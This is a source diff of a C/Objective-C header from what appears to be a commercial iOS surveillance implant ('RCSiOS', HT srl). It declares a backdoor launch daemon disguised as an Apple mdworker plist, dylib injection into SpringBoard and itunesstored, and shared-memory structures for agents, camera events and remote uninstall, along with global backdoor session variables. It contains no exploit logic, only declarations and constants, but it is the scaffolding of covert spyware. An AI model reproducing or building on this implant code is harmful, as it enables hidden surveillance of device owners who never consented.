@@ -1,8 +1,8 @@
 /*
- * RCSIpony - RCSICommon Header
+ * RCSiOS - RCSICommon Header
  *
  *
- * Created by Alfredo 'revenge' Pesoli on 08/09/2009
+ * Created on 08/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
@@ -28,6 +28,7 @@
 //#define DEBUG_LOG
 //#define DEV_MODE
 
+#define __RCS8
 #define ME __func__
 
 // enable core demo: background and sound on startup
@@ -38,8 +39,8 @@
 //
 @protocol Agents
 
-- (void)start;
-- (BOOL)stop;
+- (void)startAgent;
+- (BOOL)stopAgent;
 - (BOOL)resume;
 
 @end
@@ -65,8 +66,9 @@ typedef struct kinfo_proc kinfo_proc;
 #pragma mark -
 
 #define BACKDOOR_DAEMON_PLIST @"/Library/LaunchDaemons/com.apple.mdworker.plist"
-#define SLI_PLIST @"/Library/Preferences/com.apple.SystemLoginItems.plist"
- 
+#define SB_PATHNAME @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist"
+#define IT_PATHNAME @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist"
+
 #define LOG_PREFIX    @"LOGF"
 #define LOG_EXTENSION @".log"
 
@@ -162,8 +164,38 @@ extern u_int remoteAgents[];
 #define EVENT_BATTERY     0x200B
 #define EVENT_STANDBY     0x200C
 #define EVENT_NULL        0xFFFF
-// internal events
-#define EVENT_CAMERA_APP  0xB000
+
+// message to core: agentID
+#define CORE_NOTIFICATION       0xF000
+#define ACTION_EVENT_ENABLED    0xF001
+#define ACTION_EVENT_DISABLED   0xF002
+#define ACTION_START_AGENT      0xF003
+#define ACTION_STOP_AGENT       0xF004
+#define EVENT_CAMERA_APP        0xF005
+#define EVENT_TRIGGER_ACTION    0xF006
+#define ACTION_DO_UNINSTALL     0xF007
+
+// message to core: flag
+#define CORE_EVENT_STOPPED      0xF1
+#define CORE_ACTION_STOPPED     0xF2
+#define CORE_AGENT_STOPPED      0xF4
+
+// moduleStatus:
+#define CORE_STATUS_AM_RUN      0x00000001
+#define CORE_STATUS_EM_RUN      0x00000002
+#define CORE_STATUS_MM_RUN      0x00000004
+#define CORE_STATUS_RELOAD      0x80000000
+#define CORE_STATUS_STOPPING    0x40000000
+#define CORE_STATUS_MDLS_BITS   0x7
+#define CORE_STATUS_MDLS_ALL_STOPPED     0
+//
+#define CORE_NEED_STOP          0x00000400
+#define CORE_NEED_RESTART       0x00000800
+#define DYLIB_NEED_STOP         0x00000C00
+#define DYLIB_NEED_RESTART      0x00000C01
+#define DYLIB_NEED_UNINSTALL    0x00000C02
+#define DYLIB_NEW_CONFID        0x00000C03
+#define DYLIB_CONF_REFRESH      0x00000C04
 
 // NEW - TODO
 //#define EVENT_LOCKSCREEN  (uint)0x000x
@@ -199,6 +231,20 @@ extern u_int remoteAgents[];
 #define AGENT_STOPPED     @"STOPPED"
 #define AGENT_SUSPENDED   @"SUSPENDED"
 #define AGENT_RESTART     @"RESTART"
+
+//  
+#define AGENT_STATUS_RUNNING  0x10
+#define AGENT_STATUS_STOPPING 0x11
+#define AGENT_STATUS_STOPPED  0x12
+
+#define EVENT_STATUS_RUNNING  0x10
+#define EVENT_STATUS_STOPPING 0x11
+#define EVENT_STATUS_STOPPED  0x12
+
+// Standby flags
+#define EVENT_STANDBY_LOCK    0x1001
+#define EVENT_STANDBY_UNLOCK  0x1002
+#define EVENT_STANDBY_UNDEF   0x1000
 
 // Monitor Status
 #define EVENT_RUNNING     @"RUNNING"
@@ -399,10 +445,13 @@ typedef struct _device
 #pragma mark -
 
 // Component ID - aka who is reading from Shared Memory
-// Component ID - aka who is reading from Shared Memory
 #define COMP_CORE       0x0
 #define COMP_AGENT      0x1
 #define COMP_EXT_CALLB  0x2
+
+#define __RCS8_SHM_CMD  1
+#define __RCS8_SHM_LOG  2
+#define __RCS8_SHM_BLB  3
 
 typedef struct _shMemoryCommand {
   long  agentID;              // agentID
@@ -441,6 +490,22 @@ typedef struct _shMemoryLog {
   char  commandData[MAX_COMMAND_DATA_SIZE];
 } shMemoryLog;
 
+typedef struct {
+  uint    type;
+  uint    status;
+  uint    attributes;
+  uint    size;
+  time_t  timestamp;
+  time_t  configId;
+  char    blob[1];
+} blob_t;
+
+typedef union {
+  shMemoryCommand ipc_cmd;
+  shMemoryLog     ipc_log;
+  blob_t          ipc_blob;
+} blob_msg_t;
+
 //
 // Global variables required by the backdoor
 //
@@ -458,10 +523,11 @@ extern NSString *gBackdoorName;
 extern NSString *gBackdoorUpdateName;
 extern NSString *gConfigurationName;
 extern NSString *gConfigurationUpdateName;
+extern NSString *gCurrInstanceIDFileName;
+extern NSString *gCurrInstanceID;
 extern BOOL     gAgentCrisis;
 extern NSData   *gSessionKey;
 extern BOOL     gCameraActive;
-extern int      gLockSock;
 extern BOOL     gIsDemoMode;
 
 // OS version
@@ -482,6 +548,7 @@ enum
 int getBSDProcessList       (kinfo_proc **procList, size_t *procCount);
 NSArray *obtainProcessList  ();
 BOOL findProcessWithName    (NSString *aProcess);
+pid_t getPidByProcessName (NSString *aProcess);
 
 #pragma mark -
 #pragma mark Unused
@@ -508,6 +575,7 @@ NSString *getHostname ();
 #pragma mark -
 
 NSString *getSystemSerialNumber ();
+NSString *getCurrInstanceID();
 
 int matchPattern (const char *source, const char *pattern);
 NSArray *searchForProtoUpload (NSString *aFileMask);
@@ -518,9 +586,9 @@ BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary);
 BOOL injectDylib(NSString *sbPathname);
 
 #ifdef __cplusplus
-extern "C" { BOOL removeDylib(NSString *sbPathname); }
+extern "C" { BOOL removeDylibFromPlist(NSString *sbPathname); }
 #else
-BOOL removeDylib(NSString *sbPathname);
+BOOL removeDylibFromPlist(NSString *sbPathname);
 #endif
 
 void getSystemVersion(u_int *major,
